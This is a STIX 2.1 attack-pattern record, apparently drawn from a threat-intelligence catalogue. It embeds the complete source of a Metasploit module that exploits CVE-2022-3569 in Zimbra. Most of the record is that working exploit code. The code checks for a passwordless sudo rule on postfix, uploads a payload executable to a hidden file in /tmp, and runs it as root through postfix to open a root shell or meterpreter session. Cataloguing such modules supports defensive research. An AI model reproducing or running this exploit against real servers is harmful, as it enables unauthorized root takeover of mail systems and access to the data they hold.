{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--228c3a96-1b72-4361-a4c1-e0dce173b4d7",
    "created": "2024-08-14T16:59:42.928863Z",
    "modified": "2024-08-14T16:59:42.928868Z",
    "name": "Zimbra sudo + postfix privilege escalation",
    "description": " This module exploits a vulnerable sudo configuration that permits the zimbra user to execute postfix as root. In turn, postfix can execute arbitrary shellscripts, which means it can execute a root shell.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/zimbra_postfix_priv_esc.rb",
            "external_id": "zimbra_postfix_priv_esc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2022-3569"
        },
        {
            "source_name": "reference",
            "url": "https://twitter.com/ldsopreload/status/1580539318879547392"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Post::Linux::Priv\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Zimbra sudo + postfix privilege escalation',\n        'Description' => %q{\n          This module exploits a vulnerable sudo configuration that permits the\n          zimbra user to execute postfix as root. In turn, postfix can execute\n          arbitrary shellscripts, which means it can execute a root shell.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'EvergreenCartoons', # discovery and poc\n          'Ron Bowes',         # Module\n        ],\n        'DisclosureDate' => '2022-10-13',\n        'Platform' => [ 'linux' ],\n        'Arch' => [ ARCH_X86, ARCH_X64 ],\n        'SessionTypes' => [ 'shell', 'meterpreter' ],\n        'Privileged' => true,\n        'References' => [\n          [ 'CVE', '2022-3569' ],\n          [ 'URL', 'https://twitter.com/ldsopreload/status/1580539318879547392' ],\n        ],\n        'Targets' => [\n          [ 'Auto', {} ],\n        ],\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability' => [ CRASH_SAFE ],\n          'SideEffects' => [ IOC_IN_LOGS ]\n        }\n      )\n    )\n    register_options [\n      OptString.new('SUDO_PATH', [ true, 'Path to sudo executable', 'sudo' ]),\n      OptString.new('ZIMBRA_BASE', [ true, \"Zimbra's installation directory\", '/opt/zimbra' ]),\n    ]\n    register_advanced_options [\n      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ]),\n      OptString.new('PayloadFilename', [ false, 'The name to use for the executable (default: \".<random>\"' ])\n    ]\n  end\n\n  # Because this isn't patched, I can't say with 100% certainty that this will\n  # detect a future patch (it depends on how they patch it)\n  def check\n    # Sanity check\n    if is_root?\n      fail_with(Failure::None, 'Session already has root privileges')\n    end\n\n    unless file_exist?(\"#{datastore['ZIMBRA_BASE']}/common/sbin/postfix\")\n      print_error(\"postfix executable not detected: #{datastore['ZIMBRA_BASE']}/common/sbin/postfix (set ZIMBRA_BASE if Zimbra is installed in an unusual location)\")\n      return CheckCode::Safe\n    end\n\n    unless command_exists?(datastore['SUDO_PATH'])\n      print_error(\"Could not find sudo: #{datastore['SUDOPATH']} (set SUDO_PATH if sudo isn't in $PATH)\")\n      return CheckCode::Safe\n    end\n\n    # Run `sudo -n -l` to make sure we have access to the target command\n    cmd = \"#{datastore['SUDO_PATH']} -n -l\"\n    print_status \"Executing: #{cmd}\"\n    output = cmd_exec(cmd).to_s\n\n    if !output || output.start_with?('usage:') || output.include?('illegal option') || output.include?('a password is required')\n      print_error('Current user could not execute sudo -l')\n      return CheckCode::Safe\n    end\n\n    if !output.include?(\"(root) NOPASSWD: #{datastore['ZIMBRA_BASE']}/common/sbin/postfix\")\n      print_error('Current user does not have access to run postfix')\n      return CheckCode::Safe\n    end\n\n    CheckCode::Appears\n  end\n\n  def exploit\n    base_dir = datastore['WritableDir'].to_s\n    unless writable?(base_dir)\n      fail_with(Failure::BadConfig, \"#{base_dir} is not writable\")\n    end\n\n    # Generate some filenames\n    payload_path = File.join(base_dir, datastore['PayloadFilename'] || \".#{rand_text_alphanumeric(5..10)}\")\n    upload_and_chmodx(payload_path, generate_payload_exe)\n    register_file_for_cleanup(payload_path)\n\n    cmd = \"sudo #{datastore['ZIMBRA_BASE']}/common/sbin/postfix -D -v #{payload_path}\"\n    print_status \"Attempting to trigger payload: #{cmd}\"\n    out = cmd_exec(cmd)\n\n    unless session_created?\n      print_error(\"Failed to create session! Cmd output = #{out}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2022-10-13",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}